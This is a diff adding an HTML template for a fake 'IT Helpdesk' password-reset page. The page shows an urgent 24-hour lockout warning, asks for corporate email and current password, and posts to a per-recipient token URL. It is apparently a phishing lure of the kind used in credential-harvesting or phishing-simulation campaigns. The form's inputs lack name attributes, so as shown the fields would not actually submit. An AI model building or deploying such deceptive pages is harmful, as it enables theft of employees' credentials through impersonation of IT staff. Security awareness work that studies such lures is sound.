@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IT Helpdesk — Password Reset Required</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+  <style>
+    body { background:#f0f2f5; }
+    .card { border:none; border-radius:8px; }
+    .header-bar { background:#c00; padding:12px 24px; border-radius:8px 8px 0 0; }
+    .badge-alert { background:#fff3cd; border:1px solid #ffc107; color:#856404; border-radius:4px; padding:10px 14px; font-size:13px; }
+    .match-ok  { color:#28a745; font-size:12px; }
+    .match-err { color:#dc3545; font-size:12px; }
+    .strength-bar { height:5px; border-radius:3px; transition:width 0.3s, background 0.3s; }
+  </style>
+</head>
+<body class="d-flex align-items-center justify-content-center" style="min-height:100vh">
+<div class="card shadow" style="max-width:440px;width:100%">
+  <div class="header-bar d-flex align-items-center gap-2">
+    <span style="font-size:1.3rem">🔐</span>
+    <div>
+      <div style="color:white;font-weight:bold;font-size:15px">IT Helpdesk</div>
+      <div style="color:#ffcccc;font-size:11px">Security Operations</div>
+    </div>
+  </div>
+  <div class="card-body p-4">
+    <div class="badge-alert mb-3">
+      ⚠️ <strong>Action Required:</strong> Your password has expired and must be reset within 24 hours to avoid account lockout.
+    </div>
+    <h6 class="mb-3 text-dark">Reset Your Network Password</h6>
+    <form method="POST" action="/submit/{{ token }}" id="resetForm">
+
+      <div class="mb-3">
+        <label class="form-label small text-muted">Corporate Email</label>
+        <input type="email" class="form-control" placeholder="yourname@company.com" required>
+      </div>
+
+      <div class="mb-3">
+        <label class="form-label small text-muted">Current Password</label>
+        <input type="password" class="form-control" placeholder="Enter current password" required>
+      </div>
+
+      <div class="mb-2">
+        <label class="form-label small text-muted">New Password</label>
+        <input type="password" class="form-control" id="newPass"
+               placeholder="Enter new password" required oninput="checkPasswords(); checkStrength()">
+        <!-- Strength bar -->
+        <div class="mt-1" style="background:#e0e0e0;border-radius:3px;height:5px">
+          <div class="strength-bar" id="strengthBar" style="width:0%;background:#dc3545"></div>
+        </div>
+        <div id="strengthLabel" class="mt-1" style="font-size:11px;color:#888"></div>
+      </div>
+
+      <div class="mb-4">
+        <label class="form-label small text-muted">Confirm New Password</label>
+        <input type="password" class="form-control" id="confirmPass"
+               placeholder="Confirm new password" required oninput="checkPasswords()">
+        <div id="matchMsg" class="mt-1"></div>
+      </div>
+
+      <button class="btn w-100 text-white" id="submitBtn"
+              style="background:#c00" disabled>Reset Password</button>
+    </form>
+    <p class="text-center mt-3 small text-muted">
+      Need help? Contact <a href="#">it-support@company.com</a>
+    </p>
+  </div>
+</div>
+
+<script>
+  function checkPasswords() {
+    const np  = document.getElementById('newPass').value;
+    const cp  = document.getElementById('confirmPass').value;
+    const msg = document.getElementById('matchMsg');
+    const btn = document.getElementById('submitBtn');
+
+    if (cp === '') {
+      msg.innerHTML = '';
+      btn.disabled = true;
+      return;
+    }
+    if (np === cp) {
+      msg.innerHTML = '<span class="match-ok">✔ Passwords match</span>';
+      btn.disabled = false;
+    } else {
+      msg.innerHTML = '<span class="match-err">✘ Passwords do not match</span>';
+      btn.disabled = true;
+    }
+  }
+
+  function checkStrength() {
+    const val  = document.getElementById('newPass').value;
+    const bar  = document.getElementById('strengthBar');
+    const lbl  = document.getElementById('strengthLabel');
+    let score  = 0;
+
+    if (val.length >= 8)              score++;
+    if (/[A-Z]/.test(val))            score++;
+    if (/[0-9]/.test(val))            score++;
+    if (/[^A-Za-z0-9]/.test(val))     score++;
+
+    const levels = [
+      { w:'20%', bg:'#dc3545', label:'Weak' },
+      { w:'40%', bg:'#fd7e14', label:'Fair' },
+      { w:'70%', bg:'#ffc107', label:'Good' },
+      { w:'100%',bg:'#28a745', label:'Strong' },
+    ];
+
+    if (val.length === 0) {
+      bar.style.width   = '0%';
+      lbl.textContent   = '';
+      return;
+    }
+
+    const l = levels[score - 1] || levels[0];
+    bar.style.width      = l.w;
+    bar.style.background = l.bg;
+    lbl.style.color      = l.bg;
+    lbl.textContent      = `Password strength: ${l.label}`;
+  }
+</script>
+</body>
+</html>
